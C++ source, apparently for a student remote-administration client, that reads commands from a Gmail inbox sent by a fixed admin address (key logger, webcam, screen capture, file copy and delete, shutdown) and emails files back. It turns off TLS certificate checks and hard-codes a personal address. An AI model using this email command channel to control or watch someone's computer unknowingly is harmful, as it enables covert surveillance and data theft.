#include "Header.h"
#include "Gmail.h"

bool AnalyzeMessage(string& dataFromAdmin, char*& message) {

	int index = dataFromAdmin.find_first_of('|', 0);

	if (index != -1) {
		// Lấy phần trước dấu '|' và chuyển thành C-string
		string temp_string = dataFromAdmin.substr(0, index - 1);
		message = new char[temp_string.size() + 1];  // Cấp phát bộ nhớ cho message
		strcpy_s(message, temp_string.size() + 1, temp_string.c_str());  // Sao chép nội dung vào message

		// Cắt bỏ phần trước dấu '|' và dấu '|' để lấy phần sau
		dataFromAdmin = dataFromAdmin.substr(index + 2, dataFromAdmin.length() - index - 2);  // Cắt phần trước dấu '|' và dấu '|'
	}
	else {
		string temp_string = dataFromAdmin.substr(0, dataFromAdmin.length() - 1);
		message = new char[temp_string.size() + 1];  // Cấp phát bộ nhớ cho message
		strcpy_s(message, temp_string.size() + 1, temp_string.c_str());  // Sao chép nội dung vào message
	}

	// Trả về 1 nếu message khác dataFromAdmin, 0 nếu giống (so sánh nội dung)
	return strcmp(message, dataFromAdmin.c_str()) != 0;
}

bool checkRequest(string& dataFromAdmin, char*& message) {
	int countComponent = 1;
	int index = 0;
	index = dataFromAdmin.find_first_of('|', index);

	while (index != -1) {
		countComponent++;
		index = dataFromAdmin.find_first_of('|', index + 1);
	}

	if (AnalyzeMessage(dataFromAdmin, message)) {
		if (strcmp(message, "Close Connect") == 0 && countComponent == 1)
			return true;

		if (strcmp(message, "List Apps") == 0 && countComponent == 1)
			return true;

		if (strcmp(message, "Start App") == 0 && countComponent == 2)
			return true;

		if (strcmp(message, "Close App") == 0 && countComponent == 2)
			return true;

		if (strcmp(message, "List Services") == 0 && countComponent == 1)
			return true;

		if (strcmp(message, "Find File") == 0 && countComponent == 3)
			return true;

		if (strcmp(message, "Copy File") == 0 && countComponent == 3)
			return true;

		if (strcmp(message, "Delete File") == 0 && countComponent == 2)
			return true;

		if (strcmp(message, "Capture Screen") == 0 && countComponent == 1)
			return true;

		if (strcmp(message, "Key Logger") == 0 && countComponent == 2)
			return true;

		if (strcmp(message, "Lock Keyboard") == 0 && countComponent == 2)
			return true;

		if (strcmp(message, "Web Camera") == 0 && countComponent == 2)
			return true;

		if (strcmp(message, "Restart") == 0 && countComponent == 1)
			return true;

		if (strcmp(message, "Shutdown") == 0 && countComponent == 1)
			return true;

		return false;
	}
	else return false;
}

size_t ReadCallback(void* ptr, size_t size, size_t nmemb, void* userData) {
	string* emailData = (string*)userData;
	size_t bufferSize = size * nmemb;

	// Tính số byte cần sao chép để tránh lỗi khi sao chép quá nhiều dữ liệu
	size_t toCopy = min<size_t>(emailData->size(), bufferSize);

	if (emailData->size() > 0) {
		memcpy(ptr, emailData->c_str(), toCopy); // Sao chép dữ liệu vào buffer
		emailData->erase(0, toCopy); // Xóa phần dữ liệu đã sao chép
		return toCopy; // Trả về số byte đã sao chép
	}
	return false;  // Trả về 0 khi không còn dữ liệu để sao chép
}

void sendTextEmail(Email email, string& subjectEmail, const string& bodyEmail) {
	CURL* curl;
	CURLcode res;
	struct curl_slist* recipients = nullptr;

	// Xây dựng dữ liệu email (bao gồm tiêu đề và nội dung)
	string emailData = "To: " + email.Admin + "\r\nSubject: " + subjectEmail + "\r\n\r\n" + bodyEmail;

	curl = curl_easy_init();
	if (curl) {
		// Cấu hình thông tin máy chủ SMTP và xác thực người gửi
		curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");  // Sử dụng giao thức SMTP
		curl_easy_setopt(curl, CURLOPT_USERNAME, email.Client.c_str());
		curl_easy_setopt(curl, CURLOPT_PASSWORD, email.ClientPassword.c_str());

		// Thiết lập địa chỉ email người gửi
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, ("<" + email.Client + ">").c_str());

		// Thêm địa chỉ email người nhận (admin)
		recipients = curl_slist_append(recipients, email.Admin.c_str());
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

		// Thiết lập hàm callback để đọc dữ liệu email
		curl_easy_setopt(curl, CURLOPT_READFUNCTION, ReadCallback);
		curl_easy_setopt(curl, CURLOPT_READDATA, &emailData);

		// Thiết lập chế độ tải lên (upload) để gửi email
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

		// Thực hiện yêu cầu gửi email
		res = curl_easy_perform(curl);

		// Dọn dẹp
		curl_slist_free_all(recipients);
		curl_easy_cleanup(curl);
	}
}

void sendFileEmail(Email email, string filename, string subjectEmail, string bodyEmail) {
	CURL* curl;
	CURLcode res = CURLE_OK;
	struct curl_slist* recipients = nullptr;
	struct curl_mime* mime = nullptr;
	struct curl_mimepart* part = nullptr;

	// Thông tin máy chủ SMTP và đường dẫn tới tệp tin
	string smtp_url = "smtp://smtp.gmail.com:587";
	string file_path = filename;

	// Xây dựng dữ liệu email (bao gồm tiêu đề và nội dung)
	string emailData = "To: " + email.Admin + "\r\nSubject: " + subjectEmail + "\r\n\r\n" + bodyEmail;

	curl = curl_easy_init();
	if (curl) {
		// Cấu hình máy chủ SMTP và cổng
		curl_easy_setopt(curl, CURLOPT_URL, smtp_url.c_str());
		curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

		// Cấu hình email người gửi
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, email.Client.c_str());

		// Thêm email người nhận
		recipients = curl_slist_append(recipients, email.Admin.c_str());
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

		// Thiết lập thông tin xác thực
		curl_easy_setopt(curl, CURLOPT_USERNAME, email.Client.c_str());
		curl_easy_setopt(curl, CURLOPT_PASSWORD, email.ClientPassword.c_str());

		// Thiết lập chế độ tải lên (upload) để gửi email
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

		// Phân tách phần mở rộng của tệp tin (để xử lý MIME phù hợp)
		int index_end_file = filename.find_first_of('.');
		string end_file = filename.substr(index_end_file + 1, filename.size() - index_end_file - 1);

		// Tạo một thông điệp MIME
		mime = curl_mime_init(curl);

		// Thêm phần nội dung văn bản vào email
		part = curl_mime_addpart(mime);
		curl_mime_data(part, bodyEmail.c_str(), CURL_ZERO_TERMINATED);  // Nội dung email
		curl_mime_type(part, "text/plain");

		// Nếu là hình ảnh, thêm HTML với ảnh được nhúng vào email
		if (end_file == "png" || end_file == "jpg" || end_file == "jpeg" || end_file == "gif") {
			part = curl_mime_addpart(mime);
			curl_mime_data(part, "<html><body><img src='cid:EmbeddedContent_1' /></body></html>", CURL_ZERO_TERMINATED);
			curl_mime_type(part, "text/html");
		}

		// Thêm tệp đính kèm vào email
		part = curl_mime_addpart(mime);
		curl_mime_filedata(part, file_path.c_str());
		curl_mime_encoder(part, "base64");  // Mã hóa tệp đính kèm dưới dạng Base64

		// Thiết lập loại MIME cho tệp đính kèm
		curl_mime_type(part, ("application/" + end_file).c_str());
		curl_mime_name(part, "AttachedDocument");
		curl_mime_filename(part, filename.c_str());

		// Gắn cấu trúc MIME vào email
		curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

		// Thiết lập tiêu đề (Subject)
		string header = "Subject: " + subjectEmail;
		struct curl_slist* headers = curl_slist_append(nullptr, header.c_str());
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

		// Thực hiện yêu cầu gửi email
		res = curl_easy_perform(curl);

		// Kiểm tra lỗi
		if (res != CURLE_OK) {
			cout << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
			curl_slist_free_all(recipients);
			curl_slist_free_all(headers);
			curl_mime_free(mime);
			curl_easy_cleanup(curl);
			return;
		}

		// Dọn dẹp
		curl_slist_free_all(recipients);
		curl_slist_free_all(headers);
		curl_mime_free(mime);
		curl_easy_cleanup(curl);
	}
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
	((string*)userp)->append((char*)contents, size * nmemb);  // Thêm dữ liệu vào userp
	return size * nmemb;  // Trả về số byte đã ghi
}

string extractField(string& data, const string& field) {
	regex pattern(field + ": (.+)");
	smatch match;
	if (regex_search(data, match, pattern)) {
		return match[1].str();  // Trả về giá trị của trường đã tìm thấy
	}
	return "N/A";  // Nếu không tìm thấy trường, trả về "N/A"
}

string uidLatestEmail(string username, string password) {
	CURL* curl = curl_easy_init();
	string read_buffer;

	if (!curl) {
		return "";
	}

	// URL tới hộp thư Gmail
	curl_easy_setopt(curl, CURLOPT_URL, "imaps://imap.gmail.com/INBOX");

	// Set callback để đọc dữ liệu từ máy chủ
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

	// Lệnh IMAP để tìm các UID của email chưa đọc
	string fetch_command = "UID FETCH * BODY.PEEK[1]";
	curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, fetch_command.c_str());

	// Cài đặt thông tin xác thực
	curl_easy_setopt(curl, CURLOPT_USERNAME, username.c_str());
	curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());

	// Thực hiện yêu cầu
	CURLcode res = curl_easy_perform(curl);

	if (res != CURLE_OK) {
		curl_easy_cleanup(curl);
		read_buffer.clear();
		return "";
	}

	// Tìm vị trí bắt đầu của phần UID
	size_t indexD1 = read_buffer.find('D') + 2;
	size_t indexB = read_buffer.find('B') - 1;

	// Kiểm tra xem các chỉ số tìm kiếm có hợp lệ không
	if (indexD1 == string::npos + 2 || indexB == string::npos - 1) return "";
	if (indexD1 >= read_buffer.size() || indexB >= read_buffer.size() || indexD1 >= indexB) return "";

	// Cắt chuỗi UID từ buffer
	string latest_uid = read_buffer.substr(indexD1, indexB - indexD1);

	if (latest_uid.empty()) {
		curl_easy_cleanup(curl);
		read_buffer.clear();
		return "";
	}

	// Dọn dẹp
	curl_easy_cleanup(curl);
	read_buffer.clear();
	return latest_uid;
}

bool readEmail(Email& email, string& body) {
	CURL* curl;
	CURLcode res;
	string readBuffer;

	string email_server = "imaps://imap.gmail.com:993";

	stringstream url;
	email.UID = uidLatestEmail(email.Client, email.ClientPassword);
	url << email_server << "/INBOX/;UID=" << email.UID;  // Xác định email cần đọc

	curl = curl_easy_init();

	if (curl) {
		// Cấu hình xác thực và các tham số kết nối
		curl_easy_setopt(curl, CURLOPT_USERNAME, email.Client.c_str());
		curl_easy_setopt(curl, CURLOPT_PASSWORD, email.ClientPassword.c_str());
		curl_easy_setopt(curl, CURLOPT_URL, url.str().c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
		curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

		res = curl_easy_perform(curl);

		if (res != CURLE_OK) {
			cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
			curl_easy_cleanup(curl);
			readBuffer.clear();
			return false;  // Nếu có lỗi trong quá trình gửi email
		}
		else {
			// Trích xuất thông tin quan trọng từ email
			string subject = extractField(readBuffer, "Subject");
			string date = extractField(readBuffer, "Date");
			string from = extractField(readBuffer, "From");
			string to = extractField(readBuffer, "To");

			// Chỉ xử lý email từ admin
			if (subject == "[ADMIN] Mail to CLIENT" && from == "=?UTF-8?B?SGnhu4Nu?= <trangiahien058@gmail.com>") {
				regex plainTextPattern("Content-Type: text/plain; charset=\"UTF-8\"\\s+((.|\n)+?)\\s+--", regex_constants::ECMAScript);

				smatch contentMatch;

				if (regex_search(readBuffer, contentMatch, plainTextPattern)) {
					body = contentMatch[1].str();  // Trích xuất nội dung

					curl_easy_cleanup(curl);
					readBuffer.clear();
					return true;
				}
				// Nếu không tìm thấy text/plain, thử trích xuất text/html
				regex htmlTextPattern("Content-Type: text/html; charset=\"UTF-8\"\\s+((.|\n)+?)\\s+--", regex_constants::ECMAScript);
				if (regex_search(readBuffer, contentMatch, htmlTextPattern)) {
					body = contentMatch[1].str();
					body = regex_replace(body, regex("<[^>]+>"), "");

					curl_easy_cleanup(curl);
					readBuffer.clear();
					return true;
				}

				body = "Can't find body.";
				curl_easy_cleanup(curl);
				readBuffer.clear();
				return false;
			}
			else {
				body = "Not Admin.";
				curl_easy_cleanup(curl);
				readBuffer.clear();
				return false;
			}
		}
	}
	curl_easy_cleanup(curl);
	readBuffer.clear();
	return true;
}